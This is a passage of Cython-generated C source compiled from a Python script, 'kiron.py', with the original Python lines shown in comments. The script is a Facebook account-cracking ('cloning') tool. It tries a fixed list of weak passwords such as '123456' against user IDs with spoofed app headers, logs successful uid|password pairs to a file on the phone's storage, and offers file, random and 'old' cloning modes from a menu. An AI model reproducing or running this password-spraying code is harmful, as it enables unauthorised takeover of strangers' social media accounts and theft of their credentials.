              __Pyx_INCREF(__pyx_t_13);
              __Pyx_INCREF(function);
              __Pyx_DECREF_SET(__pyx_t_10, function);
              __pyx_t_4 = 1;
            }
          }
          #endif
          {
            PyObject *__pyx_callargs[2] = {__pyx_t_13, __pyx_t_11};
            __pyx_t_3 = __Pyx_PyObject_FastCall(__pyx_t_10, __pyx_callargs+1-__pyx_t_4, 1+__pyx_t_4);
            __Pyx_XDECREF(__pyx_t_13); __pyx_t_13 = 0;
            __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
            if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 249, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_3);
            __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
          }
          __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

          /* "kiron.py":250
 *                 print(f"\r\x1b[38;5;244m[\x1b[38;5;46mAYYUB-OK\x1b[38;5;244m]\x1b[38;5;46m {uid} \x1b[38;5;244m\x1b[38;5;46m {pw}")
 *                 open("/sdcard/AYYUB-OLD.txt","a").write(uid+"|"+pw+"\n")
 *                 oks.append(uid)             # <<<<<<<<<<<<<<
 *                 break
 *             else:continue
 */
          __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_oks); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 250, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_3);
          __pyx_t_15 = __Pyx_PyObject_Append(__pyx_t_3, __pyx_v_uid); if (unlikely(__pyx_t_15 == ((int)-1))) __PYX_ERR(0, 250, __pyx_L3_error)
          __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

          /* "kiron.py":251
 *                 open("/sdcard/AYYUB-OLD.txt","a").write(uid+"|"+pw+"\n")
 *                 oks.append(uid)
 *                 break             # <<<<<<<<<<<<<<
 *             else:continue
 *         loop+=1
 */
          goto __pyx_L10_break;

          /* "kiron.py":247
 *                 oks.append(uid)
 *                 break
 *             elif "Please Confirm Email" in str(rp):             # <<<<<<<<<<<<<<
 *                 print(f"\r\x1b[38;5;244m[\x1b[38;5;46mAYYUB-OK\x1b[38;5;244m]\x1b[38;5;46m {uid} \x1b[38;5;244m\x1b[38;5;46m {pw}")
 *                 open("/sdcard/AYYUB-OLD.txt","a").write(uid+"|"+pw+"\n")
 */
        }

        /* "kiron.py":252
 *                 oks.append(uid)
 *                 break
 *             else:continue             # <<<<<<<<<<<<<<
 *         loop+=1
 *     except:pass
 */
        /*else*/ {
          goto __pyx_L9_continue;
        }

        /* "kiron.py":226
 *         sys.stdout.write(f'\r\x1b[38;5;244m[\x1b[38;5;46m{date}\x1b[38;5;244m]\x1b[38;5;244m\x1b[38;5;46m\x1b[38;5;244m[\x1b[38;5;46m{loop}\x1b[38;5;244m]\x1b[38;5;244m-\x1b[38;5;46m\x1b[38;5;244m[\x1b[38;5;46m{len(oks)}\x1b[38;5;244m/\x1b[38;5;46m{len(cps)}\x1b[38;5;244m]')
 *         sys.stdout.flush()
 *         for pw in ["123456","1234567","12345678","123456789","123123","112233","1234567890"]:             # <<<<<<<<<<<<<<
 *             headers = {
 *             "x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)),
 */
        __pyx_L9_continue:;
      }
      __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
      goto __pyx_L12_for_end;
      __pyx_L10_break:;
      __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
      goto __pyx_L12_for_end;
      __pyx_L12_for_end:;

      /* "kiron.py":253
 *                 break
 *             else:continue
 *         loop+=1             # <<<<<<<<<<<<<<
 *     except:pass
 * #__________________| MAIN |__________________#
 */
      __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_loop); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 253, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_1);
      __pyx_t_3 = __Pyx_PyInt_AddObjC(__pyx_t_1, __pyx_int_1, 1, 1, 0); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 253, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_3);
      __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
      if (PyDict_SetItem(__pyx_d, __pyx_n_s_loop, __pyx_t_3) < 0) __PYX_ERR(0, 253, __pyx_L3_error)
      __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

      /* "kiron.py":223
 *     global oks,loop
 *     Session=requests.session()
 *     try:             # <<<<<<<<<<<<<<
 *         sys.stdout.write(f'\r\x1b[38;5;244m[\x1b[38;5;46m{date}\x1b[38;5;244m]\x1b[38;5;244m\x1b[38;5;46m\x1b[38;5;244m[\x1b[38;5;46m{loop}\x1b[38;5;244m]\x1b[38;5;244m-\x1b[38;5;46m\x1b[38;5;244m[\x1b[38;5;46m{len(oks)}\x1b[38;5;244m/\x1b[38;5;46m{len(cps)}\x1b[38;5;244m]')
 *         sys.stdout.flush()
 */
    }
    __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
    __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
    __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
    goto __pyx_L8_try_end;
    __pyx_L3_error:;
    __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
    __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
    __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;
    __Pyx_XDECREF(__pyx_t_13); __pyx_t_13 = 0;
    __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
    __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;

    /* "kiron.py":254
 *             else:continue
 *         loop+=1
 *     except:pass             # <<<<<<<<<<<<<<
 * #__________________| MAIN |__________________#
 * def menu():
 */
    /*except:*/ {
      __Pyx_ErrRestore(0,0,0);
      goto __pyx_L4_exception_handled;
    }
    __pyx_L4_exception_handled:;
    __Pyx_XGIVEREF(__pyx_t_5);
    __Pyx_XGIVEREF(__pyx_t_6);
    __Pyx_XGIVEREF(__pyx_t_7);
    __Pyx_ExceptionReset(__pyx_t_5, __pyx_t_6, __pyx_t_7);
    __pyx_L8_try_end:;
  }

  /* "kiron.py":220
 * cps=[]
 * 
 * def login(uid):             # <<<<<<<<<<<<<<
 *     global oks,loop
 *     Session=requests.session()
 */

  /* function exit code */
  __pyx_r = Py_None; __Pyx_INCREF(Py_None);
  goto __pyx_L0;
  __pyx_L1_error:;
  __Pyx_XDECREF(__pyx_t_1);
  __Pyx_XDECREF(__pyx_t_2);
  __Pyx_XDECREF(__pyx_t_3);
  __Pyx_XDECREF(__pyx_t_10);
  __Pyx_XDECREF(__pyx_t_11);
  __Pyx_XDECREF(__pyx_t_13);
  __Pyx_AddTraceback("kiron.login", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __pyx_r = NULL;
  __pyx_L0:;
  __Pyx_XDECREF(__pyx_v_Session);
  __Pyx_XDECREF(__pyx_v_pw);
  __Pyx_XDECREF(__pyx_v_headers);
  __Pyx_XDECREF(__pyx_v_rp);
  __Pyx_XGIVEREF(__pyx_r);
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

/* "kiron.py":256
 *     except:pass
 * #__________________| MAIN |__________________#
 * def menu():             # <<<<<<<<<<<<<<
 *         try:
 *                         clear()
 */

/* Python wrapper */
static PyObject *__pyx_pw_5kiron_19menu(PyObject *__pyx_self, CYTHON_UNUSED PyObject *unused); /*proto*/
static PyMethodDef __pyx_mdef_5kiron_19menu = {"menu", (PyCFunction)__pyx_pw_5kiron_19menu, METH_NOARGS, 0};
static PyObject *__pyx_pw_5kiron_19menu(PyObject *__pyx_self, CYTHON_UNUSED PyObject *unused) {
  CYTHON_UNUSED PyObject *const *__pyx_kwvalues;
  PyObject *__pyx_r = 0;
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("menu (wrapper)", 0);
  __pyx_kwvalues = __Pyx_KwValues_VARARGS(__pyx_args, __pyx_nargs);
  __pyx_r = __pyx_pf_5kiron_18menu(__pyx_self);

  /* function exit code */
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

static PyObject *__pyx_pf_5kiron_18menu(CYTHON_UNUSED PyObject *__pyx_self) {
  PyObject *__pyx_v_xd = NULL;
  PyObject *__pyx_v_file = NULL;
  PyObject *__pyx_v_fo = NULL;
  PyObject *__pyx_v_mthd = NULL;
  PyObject *__pyx_v_ps_limit = NULL;
  PyObject *__pyx_v_i = NULL;
  PyObject *__pyx_v_cx = NULL;
  PyObject *__pyx_v_crack_submit = NULL;
  PyObject *__pyx_v_total_ids = NULL;
  PyObject *__pyx_v_user = NULL;
  PyObject *__pyx_v_ids = NULL;
  PyObject *__pyx_v_names = NULL;
  PyObject *__pyx_v_passlist = NULL;
  PyObject *__pyx_r = NULL;
  __Pyx_RefNannyDeclarations
  PyObject *__pyx_t_1 = NULL;
  PyObject *__pyx_t_2 = NULL;
  PyObject *__pyx_t_3 = NULL;
  PyObject *__pyx_t_4 = NULL;
  PyObject *__pyx_t_5 = NULL;
  PyObject *__pyx_t_6 = NULL;
  int __pyx_t_7;
  Py_ssize_t __pyx_t_8;
  Py_UCS4 __pyx_t_9;
  int __pyx_t_10;
  int __pyx_t_11;
  PyObject *__pyx_t_12 = NULL;
  PyObject *__pyx_t_13 = NULL;
  PyObject *__pyx_t_14 = NULL;
  PyObject *__pyx_t_15 = NULL;
  PyObject *__pyx_t_16 = NULL;
  PyObject *__pyx_t_17 = NULL;
  PyObject *(*__pyx_t_18)(PyObject *);
  Py_ssize_t __pyx_t_19;
  int __pyx_t_20;
  PyObject *__pyx_t_21 = NULL;
  PyObject *(*__pyx_t_22)(PyObject *);
  PyObject *__pyx_t_23 = NULL;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannySetupContext("menu", 1);

  /* "kiron.py":257
 * #__________________| MAIN |__________________#
 * def menu():
 *         try:             # <<<<<<<<<<<<<<
 *                         clear()
 *                         os.system('xdg-open https://www.facebook.com/4YU8.H454N?mibextid=ZbWKwL')
 */
  {
    __Pyx_PyThreadState_declare
    __Pyx_PyThreadState_assign
    __Pyx_ExceptionSave(&__pyx_t_1, &__pyx_t_2, &__pyx_t_3);
    __Pyx_XGOTREF(__pyx_t_1);
    __Pyx_XGOTREF(__pyx_t_2);
    __Pyx_XGOTREF(__pyx_t_3);
    /*try:*/ {

      /* "kiron.py":258
 * def menu():
 *         try:
 *                         clear()             # <<<<<<<<<<<<<<
 *                         os.system('xdg-open https://www.facebook.com/4YU8.H454N?mibextid=ZbWKwL')
 *                         print(f'\x1b[38;5;244m[{A}1\x1b[38;5;244m]\x1b[38;5;46m FILE CLONING \n\x1b[38;5;244m[{A}2\x1b[38;5;244m]\x1b[38;5;46m RANDOM CLONING\n\x1b[38;5;244m[{A}3\x1b[38;5;244m]\x1b[38;5;46m OLD CLONING\n\x1b[38;5;244m[{A}0\x1b[38;5;244m]\x1b[38;5;46m EXIT TOOL')
 */
      __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_clear); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 258, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_5);
      __pyx_t_6 = NULL;
      __pyx_t_7 = 0;
      #if CYTHON_UNPACK_METHODS
      if (unlikely(PyMethod_Check(__pyx_t_5))) {
        __pyx_t_6 = PyMethod_GET_SELF(__pyx_t_5);
        if (likely(__pyx_t_6)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_5);
          __Pyx_INCREF(__pyx_t_6);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_5, function);
          __pyx_t_7 = 1;
        }
      }
      #endif
      {
        PyObject *__pyx_callargs[2] = {__pyx_t_6, NULL};
        __pyx_t_4 = __Pyx_PyObject_FastCall(__pyx_t_5, __pyx_callargs+1-__pyx_t_7, 0+__pyx_t_7);
        __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
        if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 258, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
      }
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;

      /* "kiron.py":259
 *         try:
 *                         clear()
 *                         os.system('xdg-open https://www.facebook.com/4YU8.H454N?mibextid=ZbWKwL')             # <<<<<<<<<<<<<<
 *                         print(f'\x1b[38;5;244m[{A}1\x1b[38;5;244m]\x1b[38;5;46m FILE CLONING \n\x1b[38;5;244m[{A}2\x1b[38;5;244m]\x1b[38;5;46m RANDOM CLONING\n\x1b[38;5;244m[{A}3\x1b[38;5;244m]\x1b[38;5;46m OLD CLONING\n\x1b[38;5;244m[{A}0\x1b[38;5;244m]\x1b[38;5;46m EXIT TOOL')
 *                         linex()
 */
      __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_os); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 259, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_5);
      __pyx_t_6 = __Pyx_PyObject_GetAttrStr(__pyx_t_5, __pyx_n_s_system); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 259, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_6);
      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
      __pyx_t_5 = NULL;
      __pyx_t_7 = 0;
      #if CYTHON_UNPACK_METHODS
      if (unlikely(PyMethod_Check(__pyx_t_6))) {
        __pyx_t_5 = PyMethod_GET_SELF(__pyx_t_6);
        if (likely(__pyx_t_5)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_6);
          __Pyx_INCREF(__pyx_t_5);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_6, function);
          __pyx_t_7 = 1;
        }
      }
      #endif
      {
        PyObject *__pyx_callargs[2] = {__pyx_t_5, __pyx_kp_s_xdg_open_https_www_facebook_com};
        __pyx_t_4 = __Pyx_PyObject_FastCall(__pyx_t_6, __pyx_callargs+1-__pyx_t_7, 1+__pyx_t_7);
        __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
        if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 259, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
      }
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;

      /* "kiron.py":260
 *                         clear()
 *                         os.system('xdg-open https://www.facebook.com/4YU8.H454N?mibextid=ZbWKwL')
 *                         print(f'\x1b[38;5;244m[{A}1\x1b[38;5;244m]\x1b[38;5;46m FILE CLONING \n\x1b[38;5;244m[{A}2\x1b[38;5;244m]\x1b[38;5;46m RANDOM CLONING\n\x1b[38;5;244m[{A}3\x1b[38;5;244m]\x1b[38;5;46m OLD CLONING\n\x1b[38;5;244m[{A}0\x1b[38;5;244m]\x1b[38;5;46m EXIT TOOL')             # <<<<<<<<<<<<<<
 *                         linex()
 *                         xd=input(f'\x1b[38;5;244m[{A}?\x1b[38;5;244m]\x1b[38;5;46m CHOICE : ')
 */
      __pyx_t_4 = PyTuple_New(9); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 260, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_4);
      __pyx_t_8 = 0;
      __pyx_t_9 = 127;
      __Pyx_INCREF(__pyx_kp_u_38_5_244m_2);
      __pyx_t_8 += 12;
      __Pyx_GIVEREF(__pyx_kp_u_38_5_244m_2);
      PyTuple_SET_ITEM(__pyx_t_4, 0, __pyx_kp_u_38_5_244m_2);
      __Pyx_GetModuleGlobalName(__pyx_t_6, __pyx_n_s_A); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 260, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_6);
      __pyx_t_5 = __Pyx_PyObject_FormatSimple(__pyx_t_6, __pyx_empty_unicode); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 260, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_5);
      __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
      __pyx_t_9 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_5) > __pyx_t_9) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_5) : __pyx_t_9;
      __pyx_t_8 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_5);
      __Pyx_GIVEREF(__pyx_t_5);
      PyTuple_SET_ITEM(__pyx_t_4, 1, __pyx_t_5);
      __pyx_t_5 = 0;
      __Pyx_INCREF(__pyx_kp_u_1_38_5_244m_38_5_46m_FILE_CLONIN);
      __pyx_t_8 += 50;
      __Pyx_GIVEREF(__pyx_kp_u_1_38_5_244m_38_5_46m_FILE_CLONIN);
      PyTuple_SET_ITEM(__pyx_t_4, 2, __pyx_kp_u_1_38_5_244m_38_5_46m_FILE_CLONIN);
      __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_A); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 260, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_5);
      __pyx_t_6 = __Pyx_PyObject_FormatSimple(__pyx_t_5, __pyx_empty_unicode); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 260, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_6);
      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
      __pyx_t_9 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_6) > __pyx_t_9) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_6) : __pyx_t_9;
      __pyx_t_8 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_6);
      __Pyx_GIVEREF(__pyx_t_6);
      PyTuple_SET_ITEM(__pyx_t_4, 3, __pyx_t_6);
      __pyx_t_6 = 0;
      __Pyx_INCREF(__pyx_kp_u_2_38_5_244m_38_5_46m_RANDOM_CLON);
      __pyx_t_8 += 51;
      __Pyx_GIVEREF(__pyx_kp_u_2_38_5_244m_38_5_46m_RANDOM_CLON);
      PyTuple_SET_ITEM(__pyx_t_4, 4, __pyx_kp_u_2_38_5_244m_38_5_46m_RANDOM_CLON);
      __Pyx_GetModuleGlobalName(__pyx_t_6, __pyx_n_s_A); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 260, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_6);
      __pyx_t_5 = __Pyx_PyObject_FormatSimple(__pyx_t_6, __pyx_empty_unicode); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 260, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_5);
      __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
      __pyx_t_9 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_5) > __pyx_t_9) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_5) : __pyx_t_9;
      __pyx_t_8 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_5);
      __Pyx_GIVEREF(__pyx_t_5);
      PyTuple_SET_ITEM(__pyx_t_4, 5, __pyx_t_5);
      __pyx_t_5 = 0;
      __Pyx_INCREF(__pyx_kp_u_3_38_5_244m_38_5_46m_OLD_CLONING);
      __pyx_t_8 += 48;
      __Pyx_GIVEREF(__pyx_kp_u_3_38_5_244m_38_5_46m_OLD_CLONING);
      PyTuple_SET_ITEM(__pyx_t_4, 6, __pyx_kp_u_3_38_5_244m_38_5_46m_OLD_CLONING);
      __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_A); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 260, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_5);
      __pyx_t_6 = __Pyx_PyObject_FormatSimple(__pyx_t_5, __pyx_empty_unicode); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 260, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_6);
      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
      __pyx_t_9 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_6) > __pyx_t_9) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_6) : __pyx_t_9;
      __pyx_t_8 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_6);
      __Pyx_GIVEREF(__pyx_t_6);
      PyTuple_SET_ITEM(__pyx_t_4, 7, __pyx_t_6);
      __pyx_t_6 = 0;
      __Pyx_INCREF(__pyx_kp_u_0_38_5_244m_38_5_46m_EXIT_TOOL);
      __pyx_t_8 += 33;
      __Pyx_GIVEREF(__pyx_kp_u_0_38_5_244m_38_5_46m_EXIT_TOOL);
      PyTuple_SET_ITEM(__pyx_t_4, 8, __pyx_kp_u_0_38_5_244m_38_5_46m_EXIT_TOOL);
      __pyx_t_6 = __Pyx_PyUnicode_Join(__pyx_t_4, 9, __pyx_t_8, __pyx_t_9); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 260, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_6);
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
      __pyx_t_4 = __Pyx_PyObject_CallOneArg(__pyx_builtin_print, __pyx_t_6); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 260, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_4);
      __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;

      /* "kiron.py":261
 *                         os.system('xdg-open https://www.facebook.com/4YU8.H454N?mibextid=ZbWKwL')
 *                         print(f'\x1b[38;5;244m[{A}1\x1b[38;5;244m]\x1b[38;5;46m FILE CLONING \n\x1b[38;5;244m[{A}2\x1b[38;5;244m]\x1b[38;5;46m RANDOM CLONING\n\x1b[38;5;244m[{A}3\x1b[38;5;244m]\x1b[38;5;46m OLD CLONING\n\x1b[38;5;244m[{A}0\x1b[38;5;244m]\x1b[38;5;46m EXIT TOOL')
 *                         linex()             # <<<<<<<<<<<<<<
 *                         xd=input(f'\x1b[38;5;244m[{A}?\x1b[38;5;244m]\x1b[38;5;46m CHOICE : ')
 *                         if xd in ['1','01']:
 */
      __Pyx_GetModuleGlobalName(__pyx_t_6, __pyx_n_s_linex); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 261, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_6);
      __pyx_t_5 = NULL;
      __pyx_t_7 = 0;
      #if CYTHON_UNPACK_METHODS
      if (unlikely(PyMethod_Check(__pyx_t_6))) {
        __pyx_t_5 = PyMethod_GET_SELF(__pyx_t_6);
        if (likely(__pyx_t_5)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_6);
          __Pyx_INCREF(__pyx_t_5);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_6, function);
          __pyx_t_7 = 1;
        }
      }
      #endif
      {
        PyObject *__pyx_callargs[2] = {__pyx_t_5, NULL};
        __pyx_t_4 = __Pyx_PyObject_FastCall(__pyx_t_6, __pyx_callargs+1-__pyx_t_7, 0+__pyx_t_7);
        __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
        if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 261, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
      }
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;

      /* "kiron.py":262
 *                         print(f'\x1b[38;5;244m[{A}1\x1b[38;5;244m]\x1b[38;5;46m FILE CLONING \n\x1b[38;5;244m[{A}2\x1b[38;5;244m]\x1b[38;5;46m RANDOM CLONING\n\x1b[38;5;244m[{A}3\x1b[38;5;244m]\x1b[38;5;46m OLD CLONING\n\x1b[38;5;244m[{A}0\x1b[38;5;244m]\x1b[38;5;46m EXIT TOOL')
 *                         linex()
 *                         xd=input(f'\x1b[38;5;244m[{A}?\x1b[38;5;244m]\x1b[38;5;46m CHOICE : ')             # <<<<<<<<<<<<<<
 *                         if xd in ['1','01']:
 *                                 clear();print(f'\x1b[38;5;244m[{A}*\x1b[38;5;244m]\x1b[38;5;46m EXAMPLE : /sdcard/XX.txt ');linex()
 */
      __pyx_t_4 = PyTuple_New(3); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 262, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_4);
      __pyx_t_8 = 0;
      __pyx_t_9 = 127;
      __Pyx_INCREF(__pyx_kp_u_38_5_244m_2);
      __pyx_t_8 += 12;
      __Pyx_GIVEREF(__pyx_kp_u_38_5_244m_2);
      PyTuple_SET_ITEM(__pyx_t_4, 0, __pyx_kp_u_38_5_244m_2);
      __Pyx_GetModuleGlobalName(__pyx_t_6, __pyx_n_s_A); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 262, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_6);
      __pyx_t_5 = __Pyx_PyObject_FormatSimple(__pyx_t_6, __pyx_empty_unicode); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 262, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_5);
      __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
      __pyx_t_9 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_5) > __pyx_t_9) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_5) : __pyx_t_9;
      __pyx_t_8 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_5);
      __Pyx_GIVEREF(__pyx_t_5);
      PyTuple_SET_ITEM(__pyx_t_4, 1, __pyx_t_5);
      __pyx_t_5 = 0;
      __Pyx_INCREF(__pyx_kp_u_38_5_244m_38_5_46m_CHOICE);
      __pyx_t_8 += 33;
      __Pyx_GIVEREF(__pyx_kp_u_38_5_244m_38_5_46m_CHOICE);
      PyTuple_SET_ITEM(__pyx_t_4, 2, __pyx_kp_u_38_5_244m_38_5_46m_CHOICE);
      __pyx_t_5 = __Pyx_PyUnicode_Join(__pyx_t_4, 3, __pyx_t_8, __pyx_t_9); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 262, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_5);
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
      __pyx_t_4 = __Pyx_PyObject_CallOneArg(__pyx_builtin_input, __pyx_t_5); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 262, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_4);
      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
      __pyx_v_xd = __pyx_t_4;
      __pyx_t_4 = 0;

      /* "kiron.py":263
 *                         linex()
 *                         xd=input(f'\x1b[38;5;244m[{A}?\x1b[38;5;244m]\x1b[38;5;46m CHOICE : ')
 *                         if xd in ['1','01']:             # <<<<<<<<<<<<<<
 *                                 clear();print(f'\x1b[38;5;244m[{A}*\x1b[38;5;244m]\x1b[38;5;46m EXAMPLE : /sdcard/XX.txt ');linex()
 *                                 file = input(f'\x1b[38;5;244m[{A}?\x1b[38;5;244m]\x1b[38;5;46m FILE NAME : ')
 */
      __Pyx_INCREF(__pyx_v_xd);
      __pyx_t_4 = __pyx_v_xd;
      __pyx_t_11 = (__Pyx_PyString_Equals(__pyx_t_4, __pyx_kp_s_1, Py_EQ)); if (unlikely((__pyx_t_11 < 0))) __PYX_ERR(0, 263, __pyx_L3_error)
      if (!__pyx_t_11) {
      } else {
        __pyx_t_10 = __pyx_t_11;
        goto __pyx_L10_bool_binop_done;
      }
      __pyx_t_11 = (__Pyx_PyString_Equals(__pyx_t_4, __pyx_kp_s_01, Py_EQ)); if (unlikely((__pyx_t_11 < 0))) __PYX_ERR(0, 263, __pyx_L3_error)
      __pyx_t_10 = __pyx_t_11;
      __pyx_L10_bool_binop_done:;
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
      __pyx_t_11 = __pyx_t_10;
      if (__pyx_t_11) {

        /* "kiron.py":264
 *                         xd=input(f'\x1b[38;5;244m[{A}?\x1b[38;5;244m]\x1b[38;5;46m CHOICE : ')
 *                         if xd in ['1','01']:
 *                                 clear();print(f'\x1b[38;5;244m[{A}*\x1b[38;5;244m]\x1b[38;5;46m EXAMPLE : /sdcard/XX.txt ');linex()             # <<<<<<<<<<<<<<
 *                                 file = input(f'\x1b[38;5;244m[{A}?\x1b[38;5;244m]\x1b[38;5;46m FILE NAME : ')
 *                                 try:
 */
        __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_clear); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 264, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __pyx_t_6 = NULL;
        __pyx_t_7 = 0;
        #if CYTHON_UNPACK_METHODS
        if (unlikely(PyMethod_Check(__pyx_t_5))) {
          __pyx_t_6 = PyMethod_GET_SELF(__pyx_t_5);
          if (likely(__pyx_t_6)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_5);
            __Pyx_INCREF(__pyx_t_6);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_5, function);
            __pyx_t_7 = 1;
          }
        }
        #endif
        {
          PyObject *__pyx_callargs[2] = {__pyx_t_6, NULL};
          __pyx_t_4 = __Pyx_PyObject_FastCall(__pyx_t_5, __pyx_callargs+1-__pyx_t_7, 0+__pyx_t_7);
          __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
